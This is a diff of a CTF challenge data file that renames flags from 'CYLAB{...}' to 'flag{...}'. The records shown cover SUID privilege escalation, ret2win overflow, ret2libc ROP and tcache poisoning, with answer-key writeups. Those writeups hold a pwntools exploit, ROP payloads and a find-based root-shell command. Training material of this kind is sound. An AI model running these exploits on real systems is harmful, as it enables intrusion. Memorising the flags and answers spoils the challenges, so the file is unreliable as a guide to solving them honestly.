+    "writeup": "1. Reverse the opcode handlers in Ghidra to map each opcode byte to its semantic operation.\n2. Dump bytecode section from binary `.data`.\n3. Write a Python disassembler that parses instructions and prints human-readable assembly.\n4. Analyze the bytecode algorithm: it performs RC4 key scheduling and XOR with hardcoded key.\n5. Decrypt target memory array to retrieve flag.\n6. Flag: `flag{cust0m_vm_byt3c0d3_d1s4ss3mbl3d}`"
   },
   {
     "id": "misc-7",
@@ -1353,7 +1353,7 @@
     "points": 100,
     "difficulty": "Easy",
     "description": "You gained unprivileged shell access to an Ubuntu container. Enumerate system binaries with SUID bits or elevated Linux capabilities to spawn an interactive root shell.",
-    "flag": "CYLAB{su1d_gtf0b1ns_r00t_pr1v3sc}",
+    "flag": "flag{su1d_gtf0b1ns_r00t_pr1v3sc}",
     "file_url": "",
     "hints": [
       {
@@ -1368,7 +1368,7 @@
     "concept": "Linux Privilege Escalation, SUID, GTFOBins, Capabilities",
     "cheatsheet": "checksec --file=./target",
     "badge": "Easy Misc/O",
-    "writeup": "1. Execute `find / -perm -4000 2>/dev/null`.\n2. Notice `/usr/bin/find` has SUID permission.\n3. Run GTFOBins exploit: `/usr/bin/find . -exec /bin/sh -p \\; -quit`.\n4. Shell prompt changes to `#` (root).\n5. Read `/root/flag.txt`.\n6. Flag: `CYLAB{su1d_gtf0b1ns_r00t_pr1v3sc}`"
+    "writeup": "1. Execute `find / -perm -4000 2>/dev/null`.\n2. Notice `/usr/bin/find` has SUID permission.\n3. Run GTFOBins exploit: `/usr/bin/find . -exec /bin/sh -p \\; -quit`.\n4. Shell prompt changes to `#` (root).\n5. Read `/root/flag.txt`.\n6. Flag: `flag{su1d_gtf0b1ns_r00t_pr1v3sc}`"
   },
   {
     "id": "misc-8",
@@ -1377,7 +1377,7 @@
     "points": 250,
     "difficulty": "Medium",
     "description": "A 64-bit ELF executable `vuln` reads 128 bytes into a 32-byte stack buffer using `gets()`. ASLR and stack canaries are disabled, and the binary contains an uncalled function `win()` at address `0x401176`. Overflow the return address to hijack execution.",
-    "flag": "CYLAB{r3t2w1n_st4ck_b0f_c0ntr0l}",
+    "flag": "flag{r3t2w1n_st4ck_b0f_c0ntr0l}",
     "file_url": "",
     "hints": [
       {
@@ -1392,7 +1392,7 @@
     "concept": "Buffer Overflow, Ret2Win, pwntools, x86-64 Stack Frame",
     "cheatsheet": "checksec --file=./target",
     "badge": "Medium Misc/O",
-    "writeup": "1. In GDB: `pattern create 64` and `pattern search` after segfault to determine offset is exactly 40 bytes.\n2. Obtain `win` function address in GDB: `print win` -> `0x401176`.\n3. In 64-bit systems, add a `ret` gadget for 16-byte stack alignment if crash occurs in `system` (MOVAPS issue).\n4. Exploit script:\n   ```python\n   from pwn import *\n   p = process('./vuln')\n   ret = 0x40101a\n   win = 0x401176\n   payload = b'A'*40 + p64(ret) + p64(win)\n   p.sendline(payload)\n   print(p.recvall())\n   ```\n5. Flag: `CYLAB{r3t2w1n_st4ck_b0f_c0ntr0l}`"
+    "writeup": "1. In GDB: `pattern create 64` and `pattern search` after segfault to determine offset is exactly 40 bytes.\n2. Obtain `win` function address in GDB: `print win` -> `0x401176`.\n3. In 64-bit systems, add a `ret` gadget for 16-byte stack alignment if crash occurs in `system` (MOVAPS issue).\n4. Exploit script:\n   ```python\n   from pwn import *\n   p = process('./vuln')\n   ret = 0x40101a\n   win = 0x401176\n   payload = b'A'*40 + p64(ret) + p64(win)\n   p.sendline(payload)\n   print(p.recvall())\n   ```\n5. Flag: `flag{r3t2w1n_st4ck_b0f_c0ntr0l}`"
   },
   {
     "id": "misc-9",
@@ -1401,7 +1401,7 @@
     "points": 450,
     "difficulty": "Hard",
     "description": "Target server runs with No-Execute (NX/DEP) enabled, preventing shellcode execution on the stack. Leak a libc address (`puts` GOT entry) to calculate libc base, then build a ROP chain to call `system('/bin/sh')`.",
-    "flag": "CYLAB{r3t2l1bc_r0p_ch41n_nx_byp4ss}",
+    "flag": "flag{r3t2l1bc_r0p_ch41n_nx_byp4ss}",
     "file_url": "",
     "hints": [
       {
@@ -1416,7 +1416,7 @@
     "concept": "ROP, Ret2Libc, GOT Overwrite, ASLR Bypass, pwntools",
     "cheatsheet": "checksec --file=./target",
     "badge": "Hard Misc/O",
-    "writeup": "1. Find gadgets with ROPgadget: `ROPgadget --binary vuln | grep 'pop rdi'`.\n2. Stage 1 payload:\n   `payload1 = b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)`.\n3. Parse leak and calculate libc base.\n4. Stage 2 payload:\n   `payload2 = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)`.\n5. Interactive shell opened; cat flag.\n6. Flag: `CYLAB{r3t2l1bc_r0p_ch41n_nx_byp4ss}`"
+    "writeup": "1. Find gadgets with ROPgadget: `ROPgadget --binary vuln | grep 'pop rdi'`.\n2. Stage 1 payload:\n   `payload1 = b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)`.\n3. Parse leak and calculate libc base.\n4. Stage 2 payload:\n   `payload2 = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)`.\n5. Interactive shell opened; cat flag.\n6. Flag: `flag{r3t2l1bc_r0p_ch41n_nx_byp4ss}`"
   },
   {
     "id": "misc-10",
@@ -1425,7 +1425,7 @@
     "points": 500,
     "difficulty": "Hard",
     "description": "An allocation note service allows allocating, editing, and freeing chunks. An off-by-one UAF allows corrupting chunk forward pointers. Bypass Glibc 2.35 safe linking (pointer mangling `L = (P >> 12) ^ Target`) to allocate a chunk over `__environ` and hijack control flow.",
-    "flag": "CYLAB{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}",
+    "flag": "flag{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}",
     "file_url": "",
     "hints": [
       {
@@ -1440,6 +1440,6 @@
     "concept": "Heap Exploitation, Tcache Poisoning, Safe Linking, glibc 2.35",
     "cheatsheet": "checksec --file=./target",
     "badge": "Hard Misc/O",
-    "writeup": "1. Free a chunk and leak the mangled pointer to compute heap base address: `heap_base = (leak << 12)`.\n2. Poison forward pointer with `target_addr ^ (chunk_addr >> 12)`.\n3. Allocate twice to get an arbitrary write primitive at target.\n4. Overwrite return address on stack with one_gadget.\n5. Flag: `CYLAB{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}`"
+    "writeup": "1. Free a chunk and leak the mangled pointer to compute heap base address: `heap_base = (leak << 12)`.\n2. Poison forward pointer with `target_addr ^ (chunk_addr >> 12)`.\n3. Allocate twice to get an arbitrary write primitive at target.\n4. Overwrite return address on stack with one_gadget.\n5. Flag: `flag{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}`"
   }
 ]
